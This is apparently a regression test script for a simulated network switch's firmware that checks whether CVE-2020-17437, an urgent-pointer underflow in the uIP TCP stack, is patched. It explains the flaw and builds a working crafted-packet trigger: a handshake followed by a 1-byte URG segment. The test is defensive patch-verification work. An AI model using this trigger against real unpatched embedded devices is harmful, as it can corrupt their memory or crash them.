#!/usr/bin/env python3
"""test_cve_2020_17437.py - TCP urgent-pointer out-of-bounds in uIP.

    tests/net/test_cve_2020_17437.py IMAGE [--rtlsim build/rtlsim]

CVE-2020-17437 (uIP 1.0, CVSS 8.2, AMNESIA:33). With UIP_URGDATA == 0 (how
this firmware is built) uip_process() handles a URG segment by advancing
uip_appdata and reducing uip_len by the urgent-pointer value with no bound:

    uip_appdata += (urgp[0] << 8) | urgp[1];
    uip_len     -= (urgp[0] << 8) | urgp[1];

So on an established connection a segment whose urgent pointer exceeds its
payload underflows uip_len. uip_process() then does uip_add_rcv_nxt(uip_len),
acknowledging tens of thousands of bytes never received, and hands the
application a pointer/length outside uip_buf.

The proof needs no out-of-bounds memory watch: it reads the acknowledgement
number the switch returns. We open a real connection to the web server, then
send a 1-byte segment with URG set and urgent pointer 2 (one past the
payload). Unpatched, the switch's rcv_nxt jumps by ~65535 and its ACK leaps
by that much (or httpd chokes on 64 KiB of out-of-bounds data and the switch
stops answering); patched, the urgent length is capped at the payload and the
ACK advances by at most the segment length.

The switch IP is read from the firmware (switch_ip), so this runs unchanged
on an upstream-format image or our compact build. No privileges needed.
"""
import argparse, os, struct, sys, tempfile
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "../fw"))
from console import Console, PROMPT, switch_ip, peer_ip
import test_nic
from test_nic import Peer, eth, ipv4, csum, ip_bytes, PEER_MAC, SWITCH_MAC

failures = 0
ISN = 1000          # our initial sequence number
SPORT = 40000


def check(cond, msg):
    global failures
    print(("PASS  " if cond else "FAIL  ") + msg)
    failures += not cond


def tcp(seq, ack, flags, urgp=0, payload=b""):
    """A TCP segment from SPORT to port 80, with its checksum filled in."""
    h = struct.pack("!HHIIBBHHH", SPORT, 80, seq & 0xffffffff, ack & 0xffffffff,
                    5 << 4, flags, 4096, 0, urgp) + payload
    pseudo = test_nic.PEER_IP + test_nic.SWITCH_IP + struct.pack("!BBH", 0, 6, len(h))
    return h[:16] + struct.pack("!H", 0xffff ^ csum(pseudo + h)) + h[18:]


def recv_tcp(p, timeout=2.0):
    """The next TCP segment the switch sends us: (seq, ack, flags)."""
    r = p.reply(0x0800, timeout=timeout)
    while r is not None and r[23] != 6:  # IP proto TCP
        r = p.reply(0x0800, timeout=timeout)
    if r is None:
        return None
    ip = r[14:]
    t = ip[(ip[0] & 0xf) * 4:]
    seq, ack = struct.unpack("!I", t[4:8])[0], struct.unpack("!I", t[8:12])[0]
    return seq, ack, t[13]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("image")
    ap.add_argument("--rtlsim", default=os.path.join(HERE, "../../build/rtlsim"))
    a = ap.parse_args()

    with tempfile.TemporaryDirectory() as d:
        sock = os.path.join(d, "nic.sock")
        c = Console(a.rtlsim, a.image, ["--nic", sock, "--nic-port", "4"])
        try:
            if not c.expect(PROMPT, 30):
                check(False, "boots to the prompt")
                return 1
            sip = switch_ip(c)
            test_nic.SWITCH_IP, test_nic.PEER_IP = ip_bytes(sip), ip_bytes(peer_ip(sip))
            print(f"switch IP {sip}, peer {peer_ip(sip)}")
            p = Peer(sock)

            # Learn: ARP so the switch can address its replies to us.
            arp = struct.pack("!HHBBH6s4s6s4s", 1, 0x0800, 6, 4, 1, PEER_MAC, test_nic.PEER_IP, b"\0" * 6, test_nic.SWITCH_IP)
            p.send(eth(b"\xff" * 6, 0x0806, arp))
            check(p.reply(0x0806, timeout=2) is not None, "switch answers ARP")

            # Open a connection to the web server (SYN -> SYN-ACK -> ACK).
            p.send(eth(SWITCH_MAC, 0x0800, ipv4(6, tcp(ISN, 0, 0x02))))
            sa = recv_tcp(p)
            ok = sa is not None and (sa[2] & 0x12) == 0x12 and sa[1] == ISN + 1
            check(ok, "SYN -> SYN-ACK")
            if not ok:
                return 1
            sw_isn = sa[0]
            p.send(eth(SWITCH_MAC, 0x0800, ipv4(6, tcp(ISN + 1, sw_isn + 1, 0x10))))

            # The attack: 1 byte of data, URG set, urgent pointer one past it.
            p.send(eth(SWITCH_MAC, 0x0800, ipv4(6, tcp(ISN + 1, sw_isn + 1, 0x10 | 0x20, urgp=2, payload=b"A"))))

            # Unpatched, uip_len underflows and the switch ACKs ~65535 bytes it
            # never received. Patched, the urgent length is capped at the 1-byte
            # payload: uip_len goes to 0, so the segment is absorbed with no ACK
            # (no reply is the safe outcome here, not a hang - the ARP below
            # confirms the switch is still running).
            r = recv_tcp(p, timeout=3)
            advance = (r[1] - (ISN + 1)) & 0xffffffff if r else 0
            print(f"switch acknowledged rcv_nxt +{advance} for a 1-byte payload"
                  + ("" if r else " (no reply)"))
            check(advance <= 1, f"urgent length is capped at the segment "
                  f"(rcv_nxt +{advance}, not the 65535 of the unbounded subtraction)")

            p.send(eth(b"\xff" * 6, 0x0806, arp))
            check(p.reply(0x0806, timeout=2) is not None, "switch is still running afterwards")
        finally:
            c.close()

    print(f"test_cve_2020_17437: {'ALL PASS' if not failures else f'{failures} FAILED'}")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
